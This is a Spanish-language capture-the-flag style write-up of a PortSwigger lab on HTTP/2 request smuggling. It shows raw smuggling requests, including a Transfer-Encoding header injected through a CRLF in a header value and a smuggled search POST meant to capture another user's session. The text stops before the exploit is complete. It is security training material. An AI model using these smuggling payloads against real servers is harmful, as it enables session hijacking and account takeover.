**Lab Description**
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to [the documentation](https://portswigger.net/burp/documentation/desktop/http2) for details on how to use them.

### Confirmar vulnerabilidad
**preparación del burpsuite**
Para este laboratorio interceptamos la raíz, la ruta "/", cambiamos el método a POST, hacemos click en settings, que tiene el logo de un engranaje, le sacamos el "update Content-Length" para que no nos este generando esta cabecera con el valor del boy automáticamente.
Mandamos la siguiente petición:
```
POST / HTTP/2
Host: 0a4200f80467d2a182b592c700fb000a.web-security-academy.net
Cookie: session=GunVXRbhYALhXLBlSuI4fgE4MM4vLknR;
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
X-Ignore: x
```
Pero la segunda petición no nos da un 404. Cuando el servidor rescribe la solicitud de http2 a http1.1 esta despojandose (stripping away) del transfer encoding, así que tenemos que buscar otra manear de contrabandear el transfer-encode header, para eso vamos a la columna derecha y le damos a agregar una nueva "Request headers"
![[Pasted image 20240816201826.png]]
Y agregamos una nueva cabecera
![[Pasted image 20240816201935.png]]
En el campo name iría la cabecera, en este caso "foo" y value es, valga la redundancia, el valor de ese header, en este caso Transfer-Encoding: chunked
![[Pasted image 20240816202003.png]]
Le damos un name, una cabecera con + CRLF, con enter + shift, y lo que sucede acá es que, nos esta interpretando el espacio en blanco y convierte la solicitud en un HTTP/1.1. Si no está despojandose de este.
Creamos lo que se llama una kettled request, la cual se representa como si fuera una solicitud aparte, pero en realidad es una cabecera la cual, dentro de su value, tiene un enter (crlf) y transfer encoding, lo que puede hacer que el servidor lo interprete como un header más.

Ahora tenemos que descifrar una manera de explotarlo, como siempre **revisamos cada ruta** y existe una de búsqueda
```
POST / HTTP/1.1
Host: 0abf00ab04eb7e07819e364a00b80025.web-security-academy.net
Cookie: session=zDVOCa0iwgUKSpaeNqSCKGbbnH5ghSvh; 
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

search=asd
```
Que recibe un texto plano y lo escribe
Así que envíamos esta solicitud:  
```
0

POST / HTTP/1.1
Host: 0abf00ab04eb7e07819e364a00b80025.web-security-academy.net
Cookie: session=zDVOCa0iwgUKSpaeNqSCKGbbnH5ghSvh; 
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=asd
```
